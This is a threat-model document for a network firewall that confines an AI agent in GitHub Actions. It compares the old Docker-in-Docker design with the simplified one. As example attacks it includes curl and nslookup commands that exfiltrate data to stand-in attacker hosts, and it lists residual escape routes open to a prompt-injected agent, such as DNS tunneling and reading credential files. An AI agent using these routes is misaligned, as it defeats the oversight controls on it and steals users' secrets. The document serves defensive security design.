# Threat Modeling: Evolution from Docker-in-Docker to Simplified Architecture

This document describes the threat model for the Agentic Workflow Firewall (awf) and how it has evolved after removing Docker-in-Docker support in PR #205.

## Table of Contents

- [Historical Context: Pre-PR #205 Threat Model](#historical-context-pre-pr-205-threat-model)
- [Current Architecture: Post-PR #205 Threat Model](#current-architecture-post-pr-205-threat-model)
- [Security Improvements](#security-improvements)
- [Remaining Attack Vectors](#remaining-attack-vectors)
- [Conclusion](#conclusion)

---

## Historical Context: Pre-PR #205 Threat Model

### Overview

Before PR #205, the firewall supported Docker-in-Docker (DinD) functionality, allowing the agent to spawn child containers for MCP servers or other tools. This capability introduced significant complexity and attack surface.

### Attack Chain

The pre-PR #205 attack chain for a malicious agent attempting to exfiltrate data:

1. **Initial Access**: Attacker gains code execution inside the agent container (e.g., via prompt injection)
2. **Docker Socket Access**: Agent has access to Docker socket mounted at `/var/run/docker.sock`
3. **Container Spawn Attempt**: Agent attempts to spawn a privileged container or one with network access:
   ```bash
   docker run --privileged ubuntu curl https://attacker.com/exfiltrate?data=...
   docker run --network host ubuntu curl https://attacker.com/exfiltrate?data=...
   docker run --add-host=attacker.com:MALICIOUS_IP ubuntu curl https://attacker.com
   ```
4. **Docker Wrapper Interception**: The `docker-wrapper.sh` script (100+ lines) intercepts docker commands and:
   - Blocks dangerous flags: `--privileged`, `--network host`, `--add-host`
   - Forces spawned containers onto `awf-net` network
   - Injects proxy environment variables
5. **Fallback to Proxy**: If wrapper is bypassed or has bugs, spawned container still connects to `awf-net`
6. **Squid Filtering**: All HTTP/HTTPS traffic routes through Squid proxy, which applies domain ACL rules

### Defense Layers

The pre-PR #205 architecture relied on multiple defense layers:

1. **Docker Wrapper Script** (`containers/agent/docker-wrapper.sh`)
   - 100+ lines of security-critical bash code
   - Complex regex patterns to detect and block dangerous flags
   - Argument parsing and reconstruction logic
   - Single point of failure if bugs exist

2. **Docker Socket Permission Controls**
   - Socket mounted read-write into agent container
   - Relied on wrapper to prevent abuse

3. **Network Injection for Spawned Containers**
   - Wrapper forcibly connected spawned containers to `awf-net`
   - Required correct implementation to prevent bypass

4. **Squid Proxy Domain Filtering**
   - Final enforcement layer for HTTP/HTTPS traffic
   - Domain-based ACL rules

### Vulnerabilities and Complexity

**Key weaknesses of the Docker-in-Docker approach:**

- **500+ lines of security-critical code**: Including the wrapper, tests, and integration code
- **Complex attack surface**: Multiple ways to bypass the wrapper through:
  - Flag obfuscation (e.g., `--privileged` typos that still work)
  - Argument parsing edge cases
  - Environment variable manipulation
  - Alternative Docker CLI tools (docker-compose, podman)
- **Maintenance burden**: Every Docker CLI update could introduce new dangerous flags
- **Docker socket escape risk**: Any wrapper bug could lead to privileged container spawn → full host compromise

---

## Current Architecture: Post-PR #205 Threat Model

### Overview

PR #205 removed Docker-in-Docker support entirely, eliminating the Docker socket from the agent container. This represents a fundamental simplification of the security model through **defense by removal** rather than defense by complexity.

### Attack Chain

The post-PR #205 attack chain for a malicious agent attempting to exfiltrate data:

1. **Initial Access**: Attacker gains code execution inside the agent container
2. **Docker Socket Attack → FAILS**: 
   - No `docker` or `docker-compose` CLI tools installed in agent container
   - No Docker socket mounted at `/var/run/docker.sock`
   - Result: `bash: docker: command not found`
3. **Capability-Based Escape Attempt → FAILS**:
   - Agent tries to modify iptables to bypass firewall rules
   - NET_ADMIN capability has been dropped via `capsh --drop=cap_net_admin` 
   - Result: `iptables: Permission denied`
4. **DNS Exfiltration Attempt → BLOCKED**:
   - Agent tries to encode data in DNS queries to unauthorized DNS servers
   - Host-level iptables DOCKER-USER chain only allows DNS to trusted servers (default: 8.8.8.8, 8.8.4.4)
   - Result: DNS packets to rogue servers are dropped
5. **HTTP/HTTPS Exfiltration → BLOCKED**:
   - Agent attempts to send data to unauthorized domains
   - Container-level NAT rules (setup-iptables.sh) force all HTTP/HTTPS to Squid proxy
   - Squid applies domain ACL whitelist/blacklist
   - Result: `HTTP 403 Forbidden` for unauthorized domains

### Defense Layers (Simplified)

The post-PR #205 architecture uses fewer but more robust defense layers:

1. **Host-Level iptables (DOCKER-USER Chain)**
   - Location: `src/host-iptables.ts`
   - Enforces egress filtering for ALL containers on `awf-net` network
   - Rules applied via custom `FW_WRAPPER` chain:
     ```bash
     # Squid container: unrestricted outbound (it enforces domain ACLs)
     iptables -A FW_WRAPPER -s 172.30.0.10 -j ACCEPT
     
     # All containers: allow DNS only to trusted servers
     iptables -A FW_WRAPPER -p udp -d 8.8.8.8 --dport 53 -j ACCEPT
     iptables -A FW_WRAPPER -p udp -d 8.8.4.4 --dport 53 -j ACCEPT
     
     # All containers: allow traffic to Squid proxy
     iptables -A FW_WRAPPER -p tcp -d 172.30.0.10 -j ACCEPT
     
     # Everything else: blocked
     iptables -A FW_WRAPPER -j DROP
     ```

2. **Container-Level NAT Rules**
   - Location: `containers/agent/setup-iptables.sh`
   - Runs during container startup (requires NET_ADMIN capability)
   - Redirects all outbound HTTP (port 80) and HTTPS (port 443) to Squid:
     ```bash
     iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 172.30.0.10:3128
     iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 172.30.0.10:3128
     ```
   - Transparent to applications (no proxy configuration needed)

3. **Squid Proxy L7 Domain Filtering**
   - Location: `src/squid-config.ts`
   - Inspects CONNECT requests and SNI (Server Name Indication) for HTTPS
   - Applies allowlist and blocklist with wildcard pattern matching
   - Evaluation order:
     1. Check blocklist first (immediate deny if matched)
     2. Check allowlist second (permit if matched)
     3. Default deny (403 Forbidden for all other domains)

4. **Capability Dropping (NET_ADMIN Removal)**
   - Location: `containers/agent/entrypoint.sh:144`
   - After iptables setup completes, NET_ADMIN capability is permanently dropped:
     ```bash
     exec capsh --drop=cap_net_admin -- -c "exec gosu awfuser $(printf '%q ' "$@")"
     ```
   - **Critical security property**: Capability removed from bounding set, cannot be regained
   - Prevents malicious code from modifying iptables rules to bypass firewall
   - Applied BEFORE user command execution

5. **Seccomp Profile**
   - Location: `containers/agent/seccomp-profile.json`
   - Blocks dangerous syscalls:
     - `ptrace`, `process_vm_readv`, `process_vm_writev` (process inspection/debugging)
     - `kexec_load`, `reboot` (kernel/system control)
     - `mount`, `umount` (filesystem manipulation)
     - `init_module`, `finit_module`, `delete_module` (kernel module loading)
   - Applied via Docker security-opt: `seccomp=containers/agent/seccomp-profile.json`

6. **No-New-Privileges Flag**
   - Location: `src/docker-manager.ts:367`
   - Applied via: `security_opt: ['no-new-privileges:true']`
   - Prevents privilege escalation through setuid binaries or file capabilities
   - Works in conjunction with capability dropping

---

## Security Improvements

### Attack Surface Reduction

PR #205 achieved significant security improvements through code removal and architectural simplification:

| Metric | Before PR #205 | After PR #205 | Improvement |
|--------|----------------|---------------|-------------|
| **Security-critical code** | 500+ lines (wrapper + tests + integration) | 0 lines | ✅ 100% reduction |
| **Docker socket mounted** | Yes (read-write) | No | ✅ Attack vector eliminated |
| **Privilege escalation paths** | Multiple (via docker flags) | None (no docker access) | ✅ Eliminated |
| **Defense layers required** | 4 layers (wrapper → socket → network → proxy) | 3 layers (iptables → NAT → proxy) | ✅ 25% reduction |
| **Complexity** | High (regex parsing, arg reconstruction) | Low (simple NAT redirection) | ✅ Simpler = more secure |

### Specific Improvements

#### ✅ Eliminated Docker Socket Attack Vector

**Before**: Agent could execute docker commands (though wrapper tried to block dangerous ones)
```bash
# These attempts required complex wrapper logic to block
docker run --privileged malicious-image
docker run --network host malicious-image
docker run --add-host attacker.com:1.2.3.4 malicious-image
```

**After**: Docker socket not mounted, docker CLI not installed
```bash
$ docker run malicious-image
bash: docker: command not found
```

**Impact**: Entire class of container escape attacks eliminated at the source.

#### ✅ Removed 500+ Lines of Security-Critical Code

**Before**: 
- `containers/agent/docker-wrapper.sh`: 100+ lines of bash argument parsing
- Tests for wrapper: 200+ lines
- Integration tests: 200+ lines
- Total: **500+ lines** that could contain security bugs

**After**: Zero lines of docker wrapper code

**Impact**: 
- No wrapper bugs possible
- No regex bypasses possible  
- No argument parsing edge cases
- Reduced maintenance burden

#### ✅ Simpler Threat Model = Easier to Audit

**Before**: Security required understanding:
1. Docker wrapper regex patterns and argument parsing
2. How wrapper injects network configuration
3. Edge cases in Docker CLI flag handling
4. Interaction between wrapper and Squid proxy

**After**: Security requires understanding:
1. iptables NAT redirection (industry standard)
2. Squid domain ACL rules (well-documented)
3. Linux capability system (kernel feature)

**Impact**: Standard security primitives are easier to audit, test, and reason about than custom application logic.

#### ✅ Defense Through Simplification

The post-PR #205 architecture follows the principle: **Fewer layers means fewer opportunities for bypass due to misconfiguration or implementation bugs.**

**Comparison**:

| Aspect | Docker-in-Docker (Complex) | No Docker (Simple) |
|--------|---------------------------|-------------------|
| Can agent spawn containers? | Yes (but wrapper tries to block dangerous ones) | No (docker not available) |
| Can wrapper be bypassed? | Yes (regex bugs, new flags, alternative tools) | N/A (no wrapper needed) |
| Can attacker modify iptables? | Potentially (if NET_ADMIN not properly dropped) | No (NET_ADMIN dropped via capsh) |
| Lines of security code to review | 500+ | ~200 (iptables + seccomp) |
| Custom security logic | High (bash parsing) | Low (standard tools) |

---

## Remaining Attack Vectors

While PR #205 significantly improved security, some attack vectors remain by design or are out of scope:

| Attack Vector | Mitigation | Residual Risk | Severity |
|---------------|------------|---------------|----------|
| **iptables rule bypass** | NET_ADMIN capability dropped by capsh before command execution | None (capability cannot be regained) | ✅ Mitigated |
| **DNS exfiltration to unauthorized servers** | Host-level iptables blocks DNS queries to non-trusted servers | None at network level | ✅ Mitigated |
| **DNS tunneling via trusted DNS** | Trusted DNS servers (e.g., 8.8.8.8) will resolve any domain | Data can be encoded in query names for attacker-controlled domains | ⚠️ Low |
| **Proxy pivot attack** | Container NAT rules force all HTTP/HTTPS to specific Squid IP (172.30.0.10) | Agent could try to modify NAT rules, but NET_ADMIN is dropped | ✅ Mitigated |
| **Localhost service exploitation** | Localhost traffic explicitly allowed (required for stdio MCP servers) | Agent can communicate with local services on 127.0.0.1 | ℹ️ By design |
| **Filesystem-based exfiltration** | Not addressed by firewall (out of scope) | Agent can read/write files, including secrets on disk | ℹ️ Out of scope |
| **Non-HTTP protocol abuse** | Blocked by iptables (only HTTP/HTTPS/DNS allowed) | Agent cannot use SSH, FTP, custom protocols | ✅ Mitigated |
| **Host iptables removal** | Requires root on host | Attacker with root on host has already compromised system | ℹ️ Out of threat model |

### Detailed Analysis

#### DNS Tunneling via Trusted DNS (Low Risk)

**Attack scenario**: Agent encodes sensitive data in DNS query names:
```bash
# Data encoded in subdomain of attacker-controlled domain
nslookup c2VjcmV0ZGF0YQ.exfil.attacker.com 8.8.8.8
```

**Why it's low risk**:
- Extremely slow exfiltration rate (limited by DNS query frequency)
- Easily detectable in DNS query logs
- Requires attacker to control a domain and DNS server
- Trusted DNS providers (Google, Cloudflare) may rate-limit or log suspicious patterns
- Data must be base64-encoded (expands size by 33%)

**Mitigation options** (not currently implemented):
- Use DNS filtering service as trusted DNS server
- Monitor DNS query patterns for anomalies
- Implement DNS query rate limiting

#### Localhost Communication (By Design)

**Why it's allowed**: 
- stdio-based MCP servers run as child processes in the same container
- They communicate via stdin/stdout/stderr, which appears as localhost socket communication
- Blocking localhost would break legitimate MCP server functionality

**Residual risk**: 
- Agent could exploit vulnerabilities in localhost services
- Low risk in ephemeral GitHub Actions runners (minimal localhost services)

#### Filesystem Access (Out of Scope)

**What's not protected**:
- Agent can read: `~/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd`, environment variables
- Agent can write: Any file the container user can access (entire host filesystem mounted)

**Why it's out of scope**:
- Firewall focuses on **network** egress control
- Filesystem isolation requires additional controls (not provided by awf):
  - Read-only mounts for sensitive directories
  - Separate secrets management (GitHub Actions secrets, Vault)
  - File integrity monitoring

**Recommendation**: Use GitHub Actions secrets (injected as env vars) and minimize sensitive files on runner disk.

---

## Conclusion

### Post-PR #205 Threat Model is Simpler and More Robust

The removal of Docker-in-Docker support in PR #205 represents a **significant security improvement** through architectural simplification:

1. **Attack Surface Reduction**: 500+ lines of security-critical code eliminated
2. **Docker Socket Elimination**: Entire class of container escape attacks no longer possible
3. **Simpler Audit**: Standard security primitives (iptables, capabilities, seccomp) replace custom logic
4. **Fewer Bypass Opportunities**: Each layer removed is one less layer that could be misconfigured or have bugs
5. **Stronger Guarantees**: Linux kernel capabilities and iptables are battle-tested security primitives

### Defense in Depth with Fewer Layers

The current architecture achieves **defense in depth without defense through obscurity**:

```
User Command
    ↓
Agent Container (no docker CLI, no socket access)
    ↓
NET_ADMIN dropped via capsh (cannot modify iptables)
    ↓
Container-level NAT rules (HTTP/HTTPS → Squid)
    ↓
Host-level iptables (DNS to trusted servers only, traffic to Squid only)
    ↓
Squid proxy (domain ACL whitelist/blacklist)
    ↓
Internet (only approved domains)
```

Each layer is **necessary** (not redundant) and **simple** (not complex):
- **Container isolation**: No docker tools or socket access
- **Capability control**: Cannot modify firewall rules
- **NAT redirection**: Transparent proxy enforcement
- **Host filtering**: Network-level egress control
- **Application filtering**: Domain-based ACL rules

### Key Insight: Less Code = Fewer Bugs = Stronger Security

The most secure code is code that doesn't exist. By removing Docker-in-Docker support, PR #205 eliminated:
- 500+ lines of code that could contain vulnerabilities
- Complex regex patterns that could be bypassed
- Bash argument parsing that could have edge cases
- Maintenance burden of tracking Docker CLI changes

The remaining attack surface is small, well-understood, and uses standard Linux security primitives that have been hardened over decades.

### Recommendations for Users

1. **Trust the simplification**: Fewer layers means fewer opportunities for misconfiguration
2. **Monitor logs**: Enable Squid access logs and iptables logs for forensics
3. **Use principle of least privilege**: Only whitelist domains strictly necessary for your workflow
4. **Consider DNS filtering**: For high-security environments, use DNS filtering service as trusted DNS server
5. **Separate secrets**: Use GitHub Actions secrets and minimize sensitive files on runner disk

### Future Considerations

Potential enhancements to further strengthen security (not currently implemented):
- **DNS filtering service**: Replace Google DNS with DNS filtering service to block known malicious domains
- **URL path filtering**: Enable SSL Bump mode for fine-grained URL path control (trade-off: breaks certificate pinning)
- **Rate limiting**: Implement connection rate limits to detect/prevent data exfiltration attempts
- **Anomaly detection**: Monitor traffic patterns for unusual behavior (e.g., high DNS query volume)

---

## References

- **PR #205**: [Remove Docker-in-Docker support](https://github.com/githubnext/gh-aw-firewall/pull/205)
- **Security Architecture**: `docs-site/src/content/docs/reference/security-architecture.md`
- **Container Security**: 
  - Dockerfile: `containers/agent/Dockerfile`
  - Entrypoint: `containers/agent/entrypoint.sh`
  - iptables Setup: `containers/agent/setup-iptables.sh`
  - Seccomp Profile: `containers/agent/seccomp-profile.json`
- **Host iptables**: `src/host-iptables.ts`
- **Squid Configuration**: `src/squid-config.ts`
